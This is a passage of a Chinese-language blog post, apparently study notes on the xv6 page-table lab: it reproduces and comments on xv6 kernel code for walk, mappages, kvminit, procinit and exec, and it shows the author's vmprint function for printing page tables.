class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//walk函数在虚拟地址机制中是比较重要的函数，他有两种作用，当alloc为0的时候walk函数就是单纯的通过页表和虚拟地址找到虚拟地址对应的第三级页表对应的pte地址，当alloc为0的时候就可以通过kalloc完成对页表项和页表的增加。但不管alloc是什么值，返回的都是对应的pte地址，而不是对应的物理地址</span></span><br><span class="line"><span class="comment">//当然这一切都是依赖于虚拟地址到物理地址的直接映射，不然walk查到的页表地址直接是物理地址，在操作系统层面无法再往下查找了</span></span><br><span class="line">walk(<span class="keyword">pagetable_t</span> pagetable, uint64 va, <span class="keyword">int</span> alloc)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(va &gt;= MAXVA)</span><br><span class="line">    panic(<span class="string">&quot;walk&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> level = <span class="number">2</span>; level &gt; <span class="number">0</span>; level--) &#123;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = &amp;pagetable[PX(level, va)];</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V) &#123;</span><br><span class="line">      pagetable = (<span class="keyword">pagetable_t</span>)PTE2PA(*pte);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(!alloc || (pagetable = (<span class="keyword">pde_t</span>*)kalloc()) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line">      *pte = PA2PTE(pagetable) | PTE_V;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &amp;pagetable[PX(<span class="number">0</span>, va)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个函数是比较关键的设置页表，增加页表项的函数，首先通过调用walk函数得到pte的地址，然后把对应的pa填入页表项，一直重复操作直到需要映射的地址被映射完</span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">mappages</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 va, uint64 size, uint64 pa, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 a, last;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  a = PGROUNDDOWN(va);</span><br><span class="line">  last = PGROUNDDOWN(va + size - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(pagetable, a, <span class="number">1</span>)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V)</span><br><span class="line">      panic(<span class="string">&quot;remap&quot;</span>);</span><br><span class="line">    *pte = PA2PTE(pa) | perm | PTE_V;</span><br><span class="line">    <span class="keyword">if</span>(a == last)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a += PGSIZE;</span><br><span class="line">    pa += PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对上一个函数的封装</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvmmap</span><span class="params">(uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(mappages(kernel_pagetable, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kvmmap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//比较重要的一个函数，主要是完成对内核页表的映射，前面的一些映射卡不懂捏，但是后面三个就是test,data以及陷阱帧的映射。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvminit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  kernel_pagetable = (<span class="keyword">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="built_in">memset</span>(kernel_pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// uart registers</span></span><br><span class="line">  kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// virtio mmio disk interface</span></span><br><span class="line">  kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// CLINT</span></span><br><span class="line">  kvmmap(CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PLIC</span></span><br><span class="line">  kvmmap(PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel text executable and read-only.</span></span><br><span class="line">  kvmmap(KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">  kvmmap((uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map the trampoline for trap entry/exit to</span></span><br><span class="line">  <span class="comment">// the highest virtual address in the kernel.</span></span><br><span class="line">  kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读完代码后感觉内核并不是直接运行在物理内存上的，他也遵循虚拟内存，所以要控制整个物理内存的话就需要一段虚拟地址对整个物理内存进行映射，通过这段虚拟地址控制整个物理内存。</p>
<h3 id="book-read-3"><a href="#book-read-3" class="headerlink" title="book-read"></a>book-read</h3><h4 id="创建一个地址空间"><a href="#创建一个地址空间" class="headerlink" title="创建一个地址空间"></a>创建一个地址空间</h4><p>在内核启动的时候，首先会调用main函数，main会调用上述介绍的<code>kvminit</code>来初始化内核页表，<code>kvminit</code>已经分析过了，接着看<code>kvminithart</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    consoleinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(LAB_PGTBL) || defined(LAB_LOCK)</span></span><br><span class="line">    statsinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    printfinit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;xv6 kernel is booting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    kinit();         <span class="comment">// physical page allocator</span></span><br><span class="line">    kvminit();       <span class="comment">// create kernel page table</span></span><br><span class="line">    kvminithart();   <span class="comment">// turn on paging</span></span><br><span class="line">    procinit();      <span class="comment">// process table</span></span><br><span class="line">    trapinit();      <span class="comment">// trap vectors</span></span><br><span class="line">    trapinithart();  <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinit();      <span class="comment">// set up interrupt controller</span></span><br><span class="line">    plicinithart();  <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">    binit();         <span class="comment">// buffer cache</span></span><br><span class="line">    iinit();         <span class="comment">// inode cache</span></span><br><span class="line">    fileinit();      <span class="comment">// file table</span></span><br><span class="line">    virtio_disk_init(); <span class="comment">// emulated hard disk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAB_NET</span></span><br><span class="line">    pci_init();</span><br><span class="line">    sockinit();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    </span></span><br><span class="line">    userinit();      <span class="comment">// first user process</span></span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    started = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(started == <span class="number">0</span>)</span><br><span class="line">      ;</span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hart %d starting\n&quot;</span>, cpuid());</span><br><span class="line">    kvminithart();    <span class="comment">// turn on paging</span></span><br><span class="line">    trapinithart();   <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinithart();   <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  scheduler();        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上一个函数设置好内核页表之后，这个函数就是让<code>satp</code>寄存器指向这个页表，到这里cpu才开启了虚拟内存，之前全部都是直接在物理内存上干的。</p>
<p>当开始虚拟地址之前，pc寄存器记录着下一个指令的物理地址，当开启了之后，pc寄存器就记录着下一个指令的虚拟地址，就需要翻译了，但由于xv6操作系统是采用直接映射的，所以开了和没开差不多✌</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kvminithart()</span><br><span class="line">&#123;</span><br><span class="line">  w_satp(MAKE_SATP(kernel_pagetable));</span><br><span class="line">  sfence_vma();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后又调用<code>procinit</code>函数,这个函数就是遍历所有的进程的proc结构体，然后利用kalloc申请一个页表，不过我稍微有问题的就是kalloc返回的是虚拟地址，虽说是直接映射，但是他直接默认成物理地址了，还是不太严谨，容易产生误导。然后利用<code>KSTACK</code>计算出这个进程的内核栈的虚拟地址，然后调用<code>kvmmap</code>进行映射。</p>
<p>退出for循环之后还得调用<code>kvminithart</code>函数，因为已经更改了页表，就必须刷新TLB，不然可能会映射出错，而这个函数中的<code>sfence_vma</code>函数调用会执行<code>sfence.vma</code>指令，这个指令就会刷新TLB</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">procinit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  </span><br><span class="line">  initlock(&amp;pid_lock, <span class="string">&quot;nextpid&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">      initlock(&amp;p-&gt;lock, <span class="string">&quot;proc&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Allocate a page for the process&#x27;s kernel stack.</span></span><br><span class="line">      <span class="comment">// Map it high in memory, followed by an invalid</span></span><br><span class="line">      <span class="comment">// guard page.</span></span><br><span class="line">      <span class="keyword">char</span> *pa = kalloc();</span><br><span class="line">      <span class="keyword">if</span>(pa == <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">&quot;kalloc&quot;</span>);</span><br><span class="line">      uint64 va = KSTACK((<span class="keyword">int</span>) (p - proc));</span><br><span class="line">      kvmmap(va, (uint64)pa, PGSIZE, PTE_R | PTE_W);</span><br><span class="line">      p-&gt;kstack = va;</span><br><span class="line">  &#125;</span><br><span class="line">  kvminithart();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>物理内存分配</p>
<p>分配器的代码主要集中在<code>kalloc.c</code>文件中，之前已经分析过了，在main函数中会调用<code>kinit</code>函数来初始化分配器,看着还是比较清楚地，就是把地址空间中从内核末尾到<code>PHYSTOP</code>的地址按每一页进行free,然后放到<code>freelist</code>中了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  freerange(end, (<span class="keyword">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  p = (<span class="keyword">char</span>*)PGROUNDUP((uint64)pa_start);</span><br><span class="line">  <span class="keyword">for</span>(; p + PGSIZE &lt;= (<span class="keyword">char</span>*)pa_end; p += PGSIZE)</span><br><span class="line">    kfree(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="exec代码分析"><a href="#exec代码分析" class="headerlink" title="exec代码分析"></a>exec代码分析</h4><p>exec函数是创建用户地址空间时使用的系统调用，在代码中侧重关注对elf文件的解析以及如何创建进程的地址空间。</p>
<p>函数首先经过一系列处理把elf头读到elf变量中，然后对魔数进行判断，然后调用<code>proc_pagetable(p)</code>返回个一个新的页表，这个页表中已经映射了跳板和陷阱帧。然后就是利用一个for循环把程序装载到内存中并配置页表，其中<code>uvmalloc</code>函数就是申请内存页然后配置页表，然后<code>loadseg</code>函数就是把二进制程序加载到申请的内存页中，大概是这样，但是具体如何加载elf每个段的还是看不太懂。</p>
<p>之后就是设置进程的栈，然后初始化了栈，在里面放了argc和argv,最后设置了陷阱帧的一些东西和页表。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *s, *last;</span><br><span class="line">  <span class="keyword">int</span> i, off;</span><br><span class="line">  uint64 argc, sz = <span class="number">0</span>, sp, ustack[MAXARG+<span class="number">1</span>], stackbase;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> <span class="title">elf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> <span class="title">ph</span>;</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable = <span class="number">0</span>, oldpagetable;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  begin_op();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((ip = namei(path)) == <span class="number">0</span>)&#123;</span><br><span class="line">    end_op();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ilock(ip);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check ELF header</span></span><br><span class="line">  <span class="keyword">if</span>(readi(ip, <span class="number">0</span>, (uint64)&amp;elf, <span class="number">0</span>, <span class="keyword">sizeof</span>(elf)) != <span class="keyword">sizeof</span>(elf))</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">if</span>(elf.magic != ELF_MAGIC)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((pagetable = proc_pagetable(p)) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Load program into memory.</span></span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>, off=elf.phoff; i&lt;elf.phnum; i++, off+=<span class="keyword">sizeof</span>(ph))&#123;</span><br><span class="line">    <span class="keyword">if</span>(readi(ip, <span class="number">0</span>, (uint64)&amp;ph, off, <span class="keyword">sizeof</span>(ph)) != <span class="keyword">sizeof</span>(ph))</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.type != ELF_PROG_LOAD)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span>(ph.memsz &lt; ph.filesz)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr + ph.memsz &lt; ph.vaddr)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    uint64 sz1;</span><br><span class="line">    <span class="keyword">if</span>((sz1 = uvmalloc(pagetable, sz, ph.vaddr + ph.memsz)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    sz = sz1;</span><br><span class="line">    <span class="keyword">if</span>(ph.vaddr % PGSIZE != <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(loadseg(pagetable, ph.vaddr, ip, ph.off, ph.filesz) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">  &#125;</span><br><span class="line">  iunlockput(ip);</span><br><span class="line">  end_op();</span><br><span class="line">  ip = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  p = myproc();</span><br><span class="line">  uint64 oldsz = p-&gt;sz;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate two pages at the next page boundary.</span></span><br><span class="line">  <span class="comment">// Use the second as the user stack.</span></span><br><span class="line">  sz = PGROUNDUP(sz);</span><br><span class="line">  uint64 sz1;</span><br><span class="line">  <span class="keyword">if</span>((sz1 = uvmalloc(pagetable, sz, sz + <span class="number">2</span>*PGSIZE)) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  sz = sz1;</span><br><span class="line">  uvmclear(pagetable, sz<span class="number">-2</span>*PGSIZE);</span><br><span class="line">  sp = sz;</span><br><span class="line">  stackbase = sp - PGSIZE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Push argument strings, prepare rest of stack in ustack.</span></span><br><span class="line">  <span class="keyword">for</span>(argc = <span class="number">0</span>; argv[argc]; argc++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &gt;= MAXARG)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    sp -= <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>;</span><br><span class="line">    sp -= sp % <span class="number">16</span>; <span class="comment">// riscv sp must be 16-byte aligned</span></span><br><span class="line">    <span class="keyword">if</span>(sp &lt; stackbase)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    <span class="keyword">if</span>(copyout(pagetable, sp, argv[argc], <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> bad;</span><br><span class="line">    ustack[argc] = sp;</span><br><span class="line">  &#125;</span><br><span class="line">  ustack[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// push the array of argv[] pointers.</span></span><br><span class="line">  sp -= (argc+<span class="number">1</span>) * <span class="keyword">sizeof</span>(uint64);</span><br><span class="line">  sp -= sp % <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span>(sp &lt; stackbase)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line">  <span class="keyword">if</span>(copyout(pagetable, sp, (<span class="keyword">char</span> *)ustack, (argc+<span class="number">1</span>)*<span class="keyword">sizeof</span>(uint64)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// arguments to user main(argc, argv)</span></span><br><span class="line">  <span class="comment">// argc is returned via the system call return</span></span><br><span class="line">  <span class="comment">// value, which goes in a0.</span></span><br><span class="line">  p-&gt;trapframe-&gt;a1 = sp;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Save program name for debugging.</span></span><br><span class="line">  <span class="keyword">for</span>(last=s=path; *s; s++)</span><br><span class="line">    <span class="keyword">if</span>(*s == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">      last = s+<span class="number">1</span>;</span><br><span class="line">  safestrcpy(p-&gt;name, last, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// Commit to the user image.</span></span><br><span class="line">  oldpagetable = p-&gt;pagetable;</span><br><span class="line">  p-&gt;pagetable = pagetable;</span><br><span class="line">  p-&gt;sz = sz;</span><br><span class="line">  p-&gt;trapframe-&gt;epc = elf.entry;  <span class="comment">// initial program counter = main</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = sp; <span class="comment">// initial stack pointer</span></span><br><span class="line">  proc_freepagetable(oldpagetable, oldsz);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br><span class="line"></span><br><span class="line"> bad:</span><br><span class="line">  <span class="keyword">if</span>(pagetable)</span><br><span class="line">    proc_freepagetable(pagetable, sz);</span><br><span class="line">  <span class="keyword">if</span>(ip)&#123;</span><br><span class="line">    iunlockput(ip);</span><br><span class="line">    end_op();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h3><p>打印页表,写的比较脑瘫</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _vmprint(<span class="keyword">pagetable_t</span> pagetable,<span class="keyword">int</span> level)&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">512</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">pte_t</span> pte=pagetable[i];</span><br><span class="line">    <span class="keyword">if</span>(!(pte&amp;PTE_V))&#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(level==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(level==<span class="number">2</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;.. ..&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(level==<span class="number">3</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;.. .. ..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: %p pa %p\n&quot;</span>,i,pte,PTE2PA(pte));</span><br><span class="line">    <span class="keyword">if</span>((pte&amp;(PTE_X|PTE_W|PTE_R))==<span class="number">0</span>)&#123;</span><br><span class="line">      uint64 child=PTE2PA(pte);</span><br><span class="line">      _vmprint((<span class="keyword">pagetable_t</span>)child,level+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vmprint</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;page table %p\n&quot;</span>,pagetable);</span><br><span class="line">  _vmprint(pagetable,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

